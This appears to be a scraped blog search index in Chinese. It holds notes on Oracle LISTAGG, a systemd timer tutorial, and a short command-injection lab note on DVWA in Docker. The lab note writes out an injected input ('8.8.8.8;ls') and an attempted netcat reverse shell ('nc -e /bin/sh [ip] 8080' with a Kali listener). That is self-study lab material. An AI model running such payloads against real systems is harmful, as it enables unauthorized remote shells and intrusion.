解決方案 - iUpoint - 博客園 Oracle LISTAGG 長度大於 4000 解決方案 | lizhen’s blog 但這個沒有排序… ","date":"2020-12-24","objectID":"/blog/posts/Oracle-%E4%BD%BF%E7%94%A8-listagg-%E5%A4%9A%E5%88%97%E7%BE%A4%E7%B5%84%E5%90%88%E6%88%90%E5%90%8C%E4%B8%80%E5%88%97%E6%96%B9%E6%B3%95/:2:0","tags":["oracle","sql"],"title":"Oracle 使用 listagg 多列群組合成同一列方法","uri":"/blog/posts/Oracle-%E4%BD%BF%E7%94%A8-listagg-%E5%A4%9A%E5%88%97%E7%BE%A4%E7%B5%84%E5%90%88%E6%88%90%E5%90%8C%E4%B8%80%E5%88%97%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"逗號排序 Sort delimited separated values in a string with (Oracle) SQL - Stack Overflow select listagg(somedata, '|') within group (order by somedata) somedata from ( with q as (select '|'||'9|2|6|7|5' as somedata from dual) select substr(somedata, instr(somedata, '|', 1, rownum) + 1, 1) somedata from q, (select 1 from q connect by level \u003c= length(regexp_replace(somedata, '[0-9]', ''))) ) 但這個跟 xmlagg 結合會有問題 都會跑出 null 先記錄到這邊 ","date":"2020-12-24","objectID":"/blog/posts/Oracle-%E4%BD%BF%E7%94%A8-listagg-%E5%A4%9A%E5%88%97%E7%BE%A4%E7%B5%84%E5%90%88%E6%88%90%E5%90%8C%E4%B8%80%E5%88%97%E6%96%B9%E6%B3%95/:3:0","tags":["oracle","sql"],"title":"Oracle 使用 listagg 多列群組合成同一列方法","uri":"/blog/posts/Oracle-%E4%BD%BF%E7%94%A8-listagg-%E5%A4%9A%E5%88%97%E7%BE%A4%E7%B5%84%E5%90%88%E6%88%90%E5%90%8C%E4%B8%80%E5%88%97%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"command injection 平常沒什麼看過 今天程式做弱點掃描發現這個問題 程式call web service 掃出弱點 等等web service 怎麼掃出 command injection ，改不會是誤判了 本片重點在 command injection Metasploitable 學習筆記-DVWA Command injection 命令注入攻擊與 Reverse Shell | by Kuro Huang | 資安工作者的學習之路 | Medium 裡面談到 reverse shell 也滿有趣的，本篇用 dvwa 試跑一次 資安這條路 07 - [Injection] Command injection - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 那個夜裡的資安-22(Reverse Shell) - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 ","date":"2020-12-07","objectID":"/blog/posts/Command-Injection-%E5%B0%8F%E8%A8%98/:0:0","tags":null,"title":"Command Injection 小記","uri":"/blog/posts/Command-Injection-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"安裝 dvwa 參考: 新手指南：DVWA-1.9全级别教程（完结篇，附实例）之XSS - FreeBuf网络安全行业门户 新手指南：手把手教你如何搭建自己的渗透测试环境 - FreeBuf网络安全行业门户 這邊使用 docker 安裝 dvwa docker run --rm -it -p 80:80 vulnerables/web-dvwa 用在那一台(docker)，使用 localhost 才連的到 使用http://localhost/setup.php 按下去Create / Reset database 按鈕，會自動跳回登入頁面 Username: admin Password: password ","date":"2020-12-07","objectID":"/blog/posts/Command-Injection-%E5%B0%8F%E8%A8%98/:1:0","tags":null,"title":"Command Injection 小記","uri":"/blog/posts/Command-Injection-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"Command injection 進到左邊的Command injection 輸入欄位8.8.8.8;ls做查詢，這樣就能看到 ls 也能被執行 ","date":"2020-12-07","objectID":"/blog/posts/Command-Injection-%E5%B0%8F%E8%A8%98/:2:0","tags":null,"title":"Command Injection 小記","uri":"/blog/posts/Command-Injection-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"reverse shell (失敗) ","date":"2020-12-07","objectID":"/blog/posts/Command-Injection-%E5%B0%8F%E8%A8%98/:3:0","tags":null,"title":"Command Injection 小記","uri":"/blog/posts/Command-Injection-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"docker 測試環境沒有 netcat docker 安裝 docker exec -it 63 bash # 63 試 container ID apt update apt install -y netcat 得知測試環境 docker ip docker inspect 63 | grep IP \"LinkLocalIPv6Address\": \"\", \"LinkLocalIPv6PrefixLen\": 0, \"SecondaryIPAddresses\": null, \"SecondaryIPv6Addresses\": null, \"GlobalIPv6Address\": \"\", \"GlobalIPv6PrefixLen\": 0, \"IPAddress\": \"172.17.0.2\", \"IPPrefixLen\": 16, \"IPv6Gateway\": \"\", \"IPAMConfig\": null, \"IPAddress\": \"172.17.0.2\", \"IPPrefixLen\": 16, \"IPv6Gateway\": \"\", \"GlobalIPv6Address\": \"\", \"GlobalIPv6PrefixLen\": 0, 這邊我們看到 docker IP 為 172.17.0.2 不過這邊需要讓 docker 連我的本機 IP ，如: 192.168.1.1 socat 實用網路工具 和 使用解析 unix socket 方法 | 程式狂想筆記 nc 環境在docker 環境無法使用… 有空再研究，睡覺 在Kali執行nc -vv -l -p 8080 在網頁執行nc -e /bin/sh [ip] 8080 執行指令 有空來測試Vagrant box mmckinst/dvwa - Vagrant Cloud ","date":"2020-12-07","objectID":"/blog/posts/Command-Injection-%E5%B0%8F%E8%A8%98/:3:1","tags":null,"title":"Command Injection 小記","uri":"/blog/posts/Command-Injection-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"一般我們使用排程都是用 crontab 再搭配使用flock 去做程式執行管控，這一段也有可能時間寫死程式一個flag，這無疑是要佔用檔案了 前幾天我看到 systemd 可以做排程設定 所以就簡單研究一下 其實之前就有簡單研究 一直覺得這個東西非常實用 用配置就能完成程式複雜判斷 網路上還滿多相關教學 應該可以用在正式環境上面 ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:0:0","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"了解工具名稱 Systemd 雖然指令叫 systemctl，但網路上看到都叫 systemd。 查看和控制systemd的主要命令是systemctl。該命令可用查看系統狀態和管理系統及服務。詳見systemctl(1)。 參考: systemd (正體中文) - ArchWiki ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:1:0","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"簡單使用 之前rclone 掛載硬碟小記 | 程式狂想筆記有簡單用過 後面記得要加sudo systemctl daemon-reload 後面記得要加sudo systemctl daemon-reload 後面記得要加sudo systemctl daemon-reload 因為很重要，所以講三遍!!! 一不注意就忘記了XD ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:2:0","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"一般 root 使用小記 .target ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:2:1","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"UNIT,Service,Install [Unit] 小節選項 單元文件中的 [Unit] 小節 包含與單元類型無關的通用信息。 可用的選項(亦稱\"指令\"或\"屬性\")如下： 參考: systemd.unit 中文手册 [金步国] 詳細內容:Systemd 入門教程：實戰篇 - 阮一峰的網絡日誌 備份圖 感覺上面重點都提到了… 我不忍心完整 copy \u0026 paste沒大握整理好，可以到裡面看!! 這邊整理我覺得之後可能會用到的 看大多數接學都是用 root 設定 systemd 前陣子有看到使用一般 user 操作 systemd 本篇重點實作網路案例操作看看 ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:2:2","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"systemctl –user 最近爬到一篇 一般user也可以使用 一般主機排程都是設定在 root(我之前工作大多數都 這樣) 但最近在想是不是應該可以切開一個全縣讓工程師去做設定 畢竟大多數 MIS 也看不懂程式… ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:3:0","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"一般使用者實作 建置一個 Hello-world.service vim ~/.config/systemd/user/hello-world.service [Unit] Description=Hello World Service After=systend-user-sessions.service [Service] Type=simple ExecStart=/home/malagege/hello-world.sh SyslogIdentifier=HelloWorldService [Install] WantedBy=default.target 啟用 hello-world.service systemctl --user enable hello-world.service Created symlink /home/malagege/.config/systemd/user/default.target.wants/hello-world.service → /home/malagege/.config/systemd/user/hello-world.service. ~~竟然不用做 systemctl daemon-reload!!! ~~ 我還實有看到有的教學有用systemctl --user daemon-reload 修改 timer 的時候需要 systemctl --user daemon-reload 才會生效 但我這邊沒使用就能用了 沒出現先enable 就會有了 systemctl --user status hello-world.service ● hello-world.service - Hello World Service Loaded: loaded (/home/malagege/.config/systemd/user/hello-world.service; enabled; vendor preset: enabled) Active: inactive (dead) systemctl --user start hello-world.service ~/.config/systemd/user  systemctl --user status hello-world.service ● hello-world.service - Hello World Service Loaded: loaded (/home/malagege/.config/systemd/user/hello-world.service; enabled; vendor preset: enabled) Active: active (running) since Tue 2020-11-17 23:26:23 CST; 4s ago Main PID: 10483 (hello-world.sh) CGroup: /user.slice/user-1000.slice/user@1000.service/hello-world.service ├─10483 /bin/bash /home/malagege/hello-world.sh └─10485 sleep 30 11月 17 23:26:23 malagege-K42JB systemd[1317]: Started Hello World Service. /home/malagege/.config/systemd/user/default.target.wants 裡面會出現 hello-world.service systemctl –user disable hello-world.service 成功完成簡單操作 上面案例執行參數小記 # 標準輸出到 StandardOutput=syslog # 標準錯誤輸出到 StandardError=syslog # 設置syslog中log的程序名稱 SyslogIdentifier=helloexample # 設置syslog中log類型 SyslogFacility=local0 # 設置syslog中log級別，此處為info SyslogLevel=info Install 需要設定 這邊是網路參考去配置的 參考: [Linux] 利用 Systemd 管理應用程式 – 常用指令 | 從入門到放棄 ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:3:1","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"timer 簡單說一下，這邊操作 systemd 的 timer 只有在 user 登入時候才會跑 所以需要做到開機跑 timer，需要設定 Linux 配置 我這邊有測試桌面登入，登出會有問題，但不確定是不是每個 Linux 就會這樣，但 Command Line 模式都很正常 下面會提到 ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:4:0","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"初始設定 loginctl show-user `__user_id__` 要設定 loginctl enable-linger `id -u` # 後面是放使用者名稱 或 id 會出現 ... ... ... Linger=no Linger=no 代表沒有啟用 一般通常不會打開 這個不打開的話 只要登出使用者帳號，當下 systemd 的 timer 都不會執行 這邊要注意!!疑似要用 root 權限設定 像我用一般使用者設定 但登出 timer 就沒有繼續跑了… 後來嘗試很就，root 設定 loginctl 就成功了 結果後來桌面登出有時候 systemctl –user 還是會中斷… 警告： systemd 服務是 沒有 會話的， 它們在 logind 狀態之外運行， 所以不要在 lingering 中啟用自動登陸的功能，這會導致 會話中斷。 參考:systemd (簡體中文)/User (簡體中文) - ArchWiki 用別的使用者下ps -fu _user_就可以看到有沒有起 systemd --user 有很大機率是這個原因…，不過不知道是我的 ElementaryOS 關係 顯示自動開啟不是很正確，有時候桌面登出還是會中斷 systemd 有空我再用樹莓派實體機器測試… 目前猜測用桌面登出會中斷 systemd PS: 我使用的是 ElementaryOS settings - How to enable automatic login after installing elementary OS Loki - elementary OS Stack Exchange systemd - How to apply lingering immedeately - Unix \u0026 Linux Stack Exchange 用 systemd 管理 laravel 队列和定时任务 - fairycat ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:4:1","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"操作紀錄 參考: systemd timer：取代cron和at的定时任务 | 骏马金龙 [Unit] Description = \"Hello Timer Description\" [Service] ExecStart = /home/malagege/hello-timer.sh # ExecStart = /usr/bin/curl -s -o /dev/null -w '%{http_code}' 'https://www.junmajinlong.com' [Unit] Description = \"run hello timer every 3 seconds\" [Timer] OnActiveSec = 1s OnUnitInactiveSec = 3s AccuracySec = 1us RandomizedDelaySec = 0 [Install] WantedBy = timers.target systemctl --user start hello-timer.timer systemctl --user list-timers --all NEXT LEFT LAST PASSED UNIT ACTIVATES Wed 2020-11-18 00:05:38 CST 1s left Wed 2020-11-18 00:05:35 CST 1s ago hello-timer.timer hello-timer.service systemctl --user status hello-timer.timer ● hello-timer.timer - \"run hello timer every 3 seconds\" Loaded: loaded (/home/malagege/.config/systemd/user/hello-timer.timer; enabled; vendor preset: enabled) Active: active (waiting) since Wed 2020-11-18 00:03:25 CST; 9min ago Trigger: Wed 2020-11-18 00:13:15 CST; 825ms left 11月 18 00:03:25 malagege-K42JB systemd[1317]: Started \"run hello timer every 3 seconds\". ~/.config/systemd/user  systemctl --user status hello-timer.service ● hello-timer.service - \"Hello Timer Description\" Loaded: loaded (/home/malagege/.config/systemd/user/hello-timer.service; static; vendor preset: enabled) Active: inactive (dead) since Wed 2020-11-18 00:13:18 CST; 2s ago Process: 20922 ExecStart=/home/malagege/hello-timer.sh (code=exited, status=0/SUCCESS) Main PID: 20922 (code=exited, status=0/SUCCESS) 11月 18 00:13:18 malagege-K42JB systemd[1317]: Started \"Hello Timer Description\". 11月 18 00:13:18 malagege-K42JB hello-timer.sh[20922]: hello world 很有趣的是 hello-timer.service 裡面狀態是static 不太確定是 .timer 影響到他 查看 log journalctl --user -u hello-timer.service ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:5:0","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"動態延遲執行 # 定時器啟動後，再過10分鐘第一次觸發定時任務 OnActiveSec=10m # 每次執行完任務後，再過15分鐘後再次觸發定時任務 OnUnitInactiveSec=15m # 觸發事件後，允許推遲0-10分鐘再執行被觸發的任務 AccuracySec=10m 以上指令的效果是： 啟動定時器後的10m-20m內的任一時間點觸發第一次定時任務 之後每隔15m-25m再次觸發定時任務 作者: 骏马金龙 链接: https://www.junmajinlong.com/linux/systemd/systemd_timer/ 来源: 骏马金龙 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 分開看指令，可能不是很了解 OnUnitInactiveSec 排程執行完之後會執行 service AccuracySec 會增加起排程時間 所以才會變成 15~25 分鐘執行 AccuracySec的默認值為1分鐘，所以如果不定義AccuracySec的話，即使用戶期待的是每秒觸發一次定時任務，但事實卻是會在1s-61s時間段內的一個隨機時間點觸發一次定時任務。(可以自己去觀察一下定時任務執行情況) 但是，觸發定時任務的時間點並不表示這是執行任務的時間點。觸發了定時任務，還需要根據RandomizedDelaySec的值來決定何時執行定時任務。 RandomizedDelaySec指定觸發定時任務後還需延遲一個指定範圍內的隨機時長才執行任務。該指令默認值為0，表示觸發後立即執行任務。 使用RandomizedDelaySec，主要是為了在一個時間範圍內分散大量被同時觸發的定時任務，從而避免這些定時任務集中在同一時間點執行而CPU爭搶。 可見，AccuracySec和RandomizedDelaySec的目的是相反的： 前者讓指定範圍內的定時器集中在同一個時間點一次性觸發它們的定時任務 後者讓觸發的、將要被執行的任務均勻分散在一個時間段範圍內 根據以上描述，如果用戶想要讓定時任務非常精確度地執行，需要將它們設置的足夠小。例如： AccuracySec = 1ms # 定時器到點就觸發定時任務 RandomizedDelaySec = 0 # 定時任務一觸發就立刻執行任務 我的感覺選 AccuracySec 應該會比較好 ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:5:1","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"運行級別(別打錯) systemd時代的運行級別 | 駿馬金龍 總之設定 Install 的 target timers.target 設定成timer.target 開機進然不會啟動 後來發現少加了s ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:5:2","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"查看systemd排程時間點 systemctl list-timers --no-pager NEXT表示下一次要觸發定時任務的時間點 LEFT表示現在距離下次執行任務還剩多長時間(已經確定了下一次執行的時間點)，或者顯示最近一次執行任務已經過去了多長時間(還不確定下一次執行的時間點)\u003e ，稍後解釋了AccuracySec和RandomizedDelaySec就知道為什麼會有這兩種表示方式 LAST表示上次觸發定時任務的時間點 PASSED表示距離上一次執行任務已經過去多久 UNIT表示是哪個定時器 ACTIVATES表示該定時器所觸發的任務 ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:5:3","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"查看日誌 # 查看指定服務的所有journal日誌信息 # xxx.service是定時任務的名稱 journalctl -u xxx.service # 實時監控尾部日誌，類似tail -f journalctl -f -u xxx.service # 顯示指定時間段內的日誌 # --since：從指定時間點內開始的日誌 # --until：到指定時間點為止的日誌 journalctl -u xxx.service --since=\"2020-07-04 19:06:23\" journalctl -u xxx.service --since=\"60s ago\" journalctl -u xxx.service --since=\"1min ago\" journalctl -u page_test.service --since=\"-60s\" ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:5:4","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"Calendar 一般時間執行 全部參考:systemd timer：取代cron和at的定时任务 | 骏马金龙 裡面內容豐富，建議看裡面內文 這邊貼範例 看範例修改就真的很方便 # 假如今日是2012-11-23 Fri 2012-11-23 11:12:13 → Fri 2012-11-23 11:12:13 2012-11-23 11:12:13 → Fri 2012-11-23 11:12:13 2012-11-23 11:12:13 UTC → Fri 2012-11-23 19:12:13 2012-11-23 → Fri 2012-11-23 00:00:00 12-11-23 → Fri 2012-11-23 00:00:00 11:12:13 → Fri 2012-11-23 11:12:13 11:12 → Fri 2012-11-23 11:12:00 now → Fri 2012-11-23 18:15:22 today → Fri 2012-11-23 00:00:00 today UTC → Fri 2012-11-23 16:00:00 yesterday → Fri 2012-11-22 00:00:00 tomorrow → Fri 2012-11-24 00:00:00 +3h30min → Fri 2012-11-23 21:45:22 -5s → Fri 2012-11-23 18:15:17 11min ago → Fri 2012-11-23 18:04:22 2 months 5 days ago @1395716396 → Tue 2014-03-25 03:59:56 進階使用 Sat,Mon..Wed -\u003e 周一、二、三、四 *:00 -\u003e 每小时，省略秒位 *:* -\u003e 每分钟，省略秒位 *:*:* -\u003e 每秒 *-*-01 00:00 -\u003e 每月一号，省略秒位 *-02~03 -\u003e 表示2月的倒数第三天 *-05~07/1 -\u003e 表示5月最后7天中的每一天 *-05~1..7 -\u003e 同上 Mon *-05~07/1 -\u003e 表示5月最后一个星期一 *:*:3.33/10.05 -\u003e 小数表示秒。3.33,13.38,23.43,33.48,43.53 9..17/2:00 -\u003e 从上午9点开始每隔两小时，直到下午5点 12..14:10,20 -\u003e 12到14点的第10分钟和第20分钟，即1[234]:[12]0:00 連月底跟09~17每隔兩小時執行都可以做到 Sat,Mon..Wed -\u003e 週一、二、三、四 *:00 -\u003e 每小時，省略秒位 *:* -\u003e 每分鐘，省略秒位 *:*:* -\u003e 每秒 *-*-01 00:00 -\u003e 每月一號，省略秒位 *-02~03 -\u003e 表示2月的倒數第三天 *-05~07/1 -\u003e 表示5月最後7天中的每一天 *-05~1..7 -\u003e 同上 Mon *-05~07/1 -\u003e 表示5月最後一個星期一 *:*:3.33/10.05 -\u003e 小數表示秒。3.33,13.38,23.43,33.48,43.53 9..17/2:00 -\u003e 從上午9點開始每隔兩小時，直到下午5點 12..14:10,20 -\u003e 12到14點的第10分鐘和第20分鐘，即1[234]:[12]0:00 Sat,Mon..Wed -\u003e 週一、二、三、四 *:00 -\u003e 每小時，省略秒位 *:* -\u003e 每分鐘，省略秒位 *:*:* -\u003e 每秒 *-*-01 00:00 -\u003e 每月一號，省略秒位 *-02~03 -\u003e 表示2月的倒數第三天 *-05~07/1 -\u003e 表示5月最後7天中的每一天 *-05~1..7 -\u003e 同上 Mon *-05~07/1 -\u003e 表示5月最後一個星期一 *:*:3.33/10.05 -\u003e 小數表示秒。3.33,13.38,23.43,33.48,43.53 9..17/2:00 -\u003e 從上午9點開始每隔兩小時，直到下午5點 12..14:10,20 -\u003e 12到14點的第10分鐘和第20分鐘，即1[234]:[12]0:00 快速分析工具 systemd-analyze calendar \"*:*:00\" Original form: *:*:00 Normalized form: *-*-* *:*:00 Next elapse: Sat 2020-11-21 00:01:00 CST (in UTC): Fri 2020-11-20 16:01:00 UTC From now: 24s left 後面放時間，可以看到內容 月底執行 在還沒整理上面，有特別先找的 之前就有記過排程 crontab 時間設定月底執行方法 | 程式狂想筆記 在想這個有沒有比較優的方法 As of version 233, systemd supports using \"~\" in its calendar syntax to specify dates relative to the end of the month. OnCalendar=*-02~03 means the third last day in February (the 26th or 27th, depending on whether or not it's a leap year) Mon *-05~07/1 and Mon *-05~01..07 are synonyms for the last Monday in May. https://github.com/systemd/systemd/blob/v233/NEWS#L174 How to configure Systemd Timer to run the service on last day of the month - Unix \u0026 Linux Stack Exchange 持久化 Timer段中還可以使用Unit指令和Persistent指令。 Unit=xxx.service：默認情況下，a.timer對應要執行的任務文件是a.service，使用Unit指令可以明確指定觸發定時任務事件時要執行的文件 Persistent=yes/no：只在使用了OnCalendar時有效，默認值no。設置yes時，會將上次執行任務的時間點保存在磁盤上，使得定時器再次被啟動時，可以立即判斷是否要執行丟失的任務 有間單測試，我以為設定*:*:00 超過三分鐘會執行三次，但是不會… timer [Unit] Description = user login timer [Timer] AccuracySec = 1ms RandomizedDelaySec = 0 OnCalendar = *:*:00 Persistent = yes [Install] WantedBy = timers.target service [Unit] Description = current time when task is been executed [Service] ExecStart = /bin/bash -c 'date +\"%%T\" \u003e\u003e/home/malagege/a.log' ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:5:5","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"socket 觸發啟動 Node 应用的 Systemd 启动 - 阮一峰的网络日志 這裡面有介紹 還覺得滿有趣的 但目前我這邊應該用不到這個功能 ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:6:0","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"搜尋相關文章 ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:7:0","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"詳細教學文章 systemd (正體中文) - ArchWiki 使用 systemd.timer 代替 crontab | C瓜農場 使用 systemd timer 替换 crontab | Yiran’s Blog systemd時代的運行級別 | 駿馬金龍 備份圖 systemd timer：取代cron和at的定时任务 | 骏马金龙 備份圖 Linux Systemd 詳細介紹: Unit、Unit File、Systemctl、Target | 3C 備份圖 Linux系列文章 | 骏马金龙 ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:7:1","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"與supervisor 差異 systemd vs supervisord_spacewander - SegmentFault 思否 Systemd Supervisord 肤浅对比 systemd 和 supervisor 相比各有哪些优缺点？以及各自的适用场景是什么？ - 知乎 之前分不清楚systemd 和 supervisor 最後看教學，一個是系統層級的、一個是應用層級的 最後還是決定學好 systemd 不過後來發現 timer 相關設定 supervisor 沒有相關設定 ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:7:2","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"跟 docker 差異 Systemd与Docker的爱恨情仇 - DockOne.io 使用 systemd 管理 Docker container 之前有改想過systemd 管理docker 排程，但好像不建議這樣做… ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:7:3","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"Failed to connect to bus: No such file or directory\" 我們公司環境沒版法使用 systemctl --user 不知道是不是沒有 D-Bus關係 以下文章都嘗試過，還是沒辦法使用 linux - systemctl –use Failed to connect to bus: No such file or directory Debian 9 - Super User systemd user “Failed to connect to bus: No such file or directory” docker centos 使用 systemctl Failed to get D-Bus connection: Operation not permitted_彻底拆分，一切可控！-CSDN博客 docker centos 使用 systemctl Failed to get D-Bus connection: Operation not permitted_彻底拆分，一切可控！-CSDN博客 XDG_RUNTIME_DIR=/run/user/id -u ~~建立資料夾??~~沒有用 https://answers.launchpad.net/ubuntu/+source/systemd/+question/287454 XDG_RUNTIME_DIR=/run/user/$UID systemctl –user status 我電腦 ElementaryOS 新家的參數 ","date":"2020-12-07","objectID":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/:7:4","tags":["systemd","crontab"],"title":"Systemd 時間排程筆記","uri":"/blog/posts/Systemd-%E6%99%82%E9%96%93%E6%8E%92%E7%A8%8B%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"其他參數 work dir Trying to change WorkingDirectory of Systemd Service Unit | DigitalOcean WorkingDirectory=/home/pi ExecStart=/home/pi/launchscript.sh ExecStart 必須要完整路徑 timeout centos - How to change systemd service timeout value? - Unix \u0026 Linux Stack Exchange TimeoutStartSec= 設置該服務允許的最大啟動時長。 如果守護進程未能在限定的時長內發出\"啟動完畢\"的信號，那麼該服務將被視為啟動失敗，並會被關閉。 如果未指定時間單位，那麼將視為以秒為單位。 例如設為\"20\"等價於設為\"20s\"。 設為 “infinity” 則表示永不超時。 當 Type=oneshot 時， 默認值為 “infinity” (永不超時)， 否則默認值等於 DefaultTimeoutStartSec= 的值(參見 systemd-system.conf(5) 手冊)。 如果一個 Type=notify 服務發送了 “EXTEND_TIMEOUT_USEC=…” 信號， 